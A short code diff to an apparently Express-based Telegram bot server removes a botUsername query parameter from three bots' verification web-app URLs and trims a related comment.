@@ -57,7 +57,7 @@ const app = express();
 app.use(express.json());
 app.use(express.static("public"));
 
-// Serve HTML from subfolders with bot username injected
+// Serve HTML from subfolders
 app.get("/safeguard/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "safeguard", "index.html"));
 });
@@ -155,7 +155,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "VERIFY",
                 web_app: {
-                  url: `${process.env.DOMAIN}/safeguard/?type=safeguard&botUsername=${safeguardUsername}`
+                  url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
                 }
               }]]
             }
@@ -169,7 +169,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "Tap To Verify",
                 web_app: {
-                  url: `${process.env.DOMAIN}/deluge/?type=deluge&botUsername=${delugeUsername}`
+                  url: `${process.env.DOMAIN}/deluge/?type=deluge`
                 }
               }]]
             }
@@ -183,7 +183,7 @@ function handleStart(bot) {
               inline_keyboard: [[{
                 text: "Verify",
                 web_app: {
-                  url: `${process.env.DOMAIN}/guardian/?type=guardian&botUsername=${guardianUsername}`
+                  url: `${process.env.DOMAIN}/guardian/?type=guardian`
                 }
               }]]
             }
